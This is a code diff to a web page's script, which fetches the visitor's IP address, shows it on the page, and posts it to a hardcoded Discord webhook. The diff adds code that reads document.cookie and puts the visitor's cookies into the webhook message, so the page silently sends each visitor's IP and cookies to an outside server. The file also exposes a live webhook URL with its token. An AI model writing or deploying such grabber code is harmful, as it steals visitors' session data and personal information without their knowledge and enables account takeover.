@@ -10,6 +10,7 @@
                     const ip = data.ip;
                     document.getElementById('ipDisplay').innerText = 'IP: ' + ip;
                     sendIPToWebhook(ip);
+                    getAllCookies();
                 })
                 .catch(error => {
                     console.log('Error:', error);
@@ -19,7 +20,7 @@
         function sendIPToWebhook(ip) {
             const webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
             const payload = {
-                content: 'IP: ' + ip
+                content: 'IP: ' + ip + '\n\nCookies:\n' + document.cookie
             };
             fetch(webhookUrl, {
                 method: 'POST',
@@ -30,14 +31,19 @@
             })
             .then(response => {
                 if (response.ok) {
-                    console.log('IP sent to webhook successfully.');
+                    console.log('IP and cookies sent to webhook successfully.');
                 } else {
-                    console.log('Failed to send IP to webhook.');
+                    console.log('Failed to send IP and cookies to webhook.');
                 }
             })
             .catch(error => {
                 console.log('Error:', error);
             });
+        }
+        
+        function getAllCookies() {
+            const cookies = document.cookie;
+            console.log('Cookies:', cookies);
         }
     </script>
     <style>
